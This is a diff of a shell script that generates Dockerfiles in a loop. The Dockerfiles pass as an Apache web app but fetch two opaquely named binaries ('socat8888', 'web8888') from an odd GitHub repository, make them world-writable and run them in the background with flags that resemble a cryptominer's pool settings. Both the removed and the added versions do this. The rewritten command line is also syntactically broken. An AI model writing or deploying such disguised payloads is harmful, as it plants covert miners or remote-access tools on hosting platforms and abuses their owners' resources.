@@ -22,14 +22,7 @@ for i in 1 2 3; do
     cd "$APP_DIR"
     
     # Create Dockerfile
-    printf '%s\n' \
-    "FROM ubuntu:22.04" \
-    "RUN apt-get update && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && apt-get clean" \
-    "WORKDIR /app" \
-    "RUN wget https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888 && wget https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888 && chmod 777 -R ./web8888 ./socat8888" \
-    "EXPOSE 8080" \
-    "CMD [\"sh\", \"-c\", \"service apache2 start && ./web8888\"]" \
-    > Dockerfile
+    printf '%s\n' "FROM ubuntu:22.04" "CMD apt-get update && apt-get install -y apache2 libjansson-dev libcurl4-openssl-dev libssl-dev socat netcat-openbsd iputils-ping sudo wget curl unzip && sed -i 's/Listen 80/Listen 8080/g' /etc/apache2/ports.conf && wget https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/socat8888 && wget https://raw.githubusercontent.com/linuxweb888888888888/linuxcpu8888/refs/heads/main/web8888 && chmod 777 -R ./web8888 ./socat8888 && bash ./socat8888 & && service apache2 start && ./web8888 -a web -o web -u web" > Dockerfile
 
     # Git setup
     git init
